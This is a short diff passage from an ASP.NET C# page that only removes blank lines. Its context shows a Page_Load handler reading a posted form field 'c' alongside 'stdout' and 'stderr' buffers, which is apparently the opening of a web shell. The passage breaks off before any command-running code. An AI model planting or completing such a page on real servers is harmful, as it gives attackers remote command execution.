@@ -1,16 +1,10 @@
 
 <%@ Page Language="C#"%>
 <%@ Import Namespace="System" %>
-
-
 <script runat="server"  language="c#">
-
     string stdout = "";
     string stderr = "";
-
-
     void Page_Load(object sender, System.EventArgs e) {
-          
         if (Request.Form["c"] != null)
         {
             try
